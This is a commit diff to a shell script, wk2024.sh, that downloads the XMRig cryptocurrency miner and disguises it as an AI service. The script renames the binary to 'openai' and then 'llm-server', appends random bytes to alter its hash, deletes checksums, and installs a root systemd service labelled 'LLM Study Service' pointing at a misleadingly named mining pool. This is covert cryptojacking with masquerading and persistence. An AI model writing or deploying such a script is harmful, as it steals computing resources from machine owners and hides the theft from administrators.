c9bd2ccd15838bac43b77f8f011d0f48b20c8379
caippx <37325838+caippx@users.noreply.github.com>
2024-12-21 22:03:52 +0800

    Update wk2024.sh

--- drfytgybhunjoimkol/wk2024.sh
+++ drfytgybhunjoimkol/wk2024.sh
@@ -2,25 +2,25 @@
 
 U=$1
 latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
-wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
-tar -zxvf 1.tar.gz
-mv xmrig-$latest openai
-mv openai/xmrig openai/openai
-mv openai /etc/openai
-rm -rf 1.tar.gz
-cd /etc/openai && rm -rf SHA256SUMS
-random_number=$((RANDOM % 188 + 68))
-for i in $(seq 1 $random_number); do
-  echo -n "0" >> /etc/openai/openai
+wget -O LLM.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
+tar -zxvf LLM.tar.gz
+mv xmrig-$latest LLM
+mv LLM/xmrig LLM/llm-server
+mv LLM /etc/LLM
+rm -rf LLM.tar.gz
+cd /etc/LLM && rm -rf SHA256SUMS
+count=$((RANDOM % 1000 + 1))
+for ((i = 0; i < count; i++)); do
+  echo -n "0" >> "/etc/LLM/llm-server"
 done
-cat > /etc/systemd/system/openai.service <<EOL
+cat > /etc/systemd/system/llm.service <<EOL
 [Unit]
-Description=OpenAI Service
+Description=LLM Study Service
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/etc/openai/openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $1 -p x
+ExecStart=/etc/LLM/llm-server -config 
 Restart=on-failure
 User=root
 
@@ -29,8 +29,8 @@ WantedBy=multi-user.target
 EOL
 
 systemctl daemon-reload
-systemctl enable openai.service
-systemctl start openai.service
+systemctl enable llm.service
+systemctl start llm.service
 sleep 2
-systemctl status openai.service
+systemctl status llm.service
 #./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
